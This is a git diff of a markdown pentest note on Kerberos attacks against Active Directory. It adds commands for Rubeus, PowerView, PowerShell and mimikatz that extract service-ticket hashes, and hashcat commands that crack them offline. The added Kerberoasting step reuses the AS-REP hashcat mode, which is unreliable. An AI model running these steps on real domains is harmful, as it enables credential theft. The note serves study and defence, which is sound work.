@@ -61,7 +61,7 @@ We can use [Rubeus](https://github.com/GhostPack/Rubeus) on a domain joined mach
 
 The AS-REP hash can then be fed into hashcat for offline attacks i.e. with brute-force or wordlist attacks.
 
-````hashcat64.exe -m 18200 '$krb5asrep$23$...' -a 0 c:\wordlists\rockyou.txt````
+````hashcat64.exe -m 18200 '<AS_REP-hash>' -a 0 c:\wordlists\rockyou.txt````
 
 
 ### Mitigation
@@ -99,21 +99,35 @@ The attacker can intercept or extract the ticket from memory, and crack the hash
 [Rubeus](https://github.com/GhostPack/Rubeus), [mimikatz](https://github.com/gentilkiwi/mimikatz) or [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) can be used to fetch the tickets and extract the hashes for offline cracking.
 
 **Rubeus**  
-The following attack will try to roast all users on the current domain leaving us with a crackable format for hashcat:  
+The following attack will try to roast all users on the current domain leaving us with hashes in a crackable format for hashcat:  
 
 ````Rubeus.exe kerberoast /format:hashcat````
 
 **PowerView**  
-Get-DomainSPNTicket -SPN <spn> -OutputFormat hashcat
-
-
-t. 
-
-With the help of  we can get a list of all user accounts that have a **SPN** set:
+We can get a list of all user accounts that have a **SPN** set:  
 
 ````Get-DomainUser -SPN````
 
+Afterwards we can fetch the hashes like so:  
+
+````Get-DomainSPNTicket -SPN <spn> -OutputFormat hashcat````
+
+**mimikatz**  
+mimikatz can be used to extract **STs** from memory. But beforehand you will have to identify **SPNs** and ask for tickets for them.  
+Having a look at the PowerView section above we are already able to query the desired **SPNs**.  
+Next step is to query for the **ST** which can be done with two lines of powershell:
+
+````
+Add-Type –AssemblyName System.IdentityModel  
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken –ArgumentList ‘<SPN-name>:<SPN-port>’
+````
+
+In order to extract the ticket from memory we use mimikatz: 
 ````kerberos::list /export````
+
+**hashcat**  
+The output from Rubeus and PowerView can directly be feeded into hashcat:  
+````hashcat64.exe -m 18200 '<AS_REP-hash>' -a 0 c:\wordlists\rockyou.txt````
 
 
 
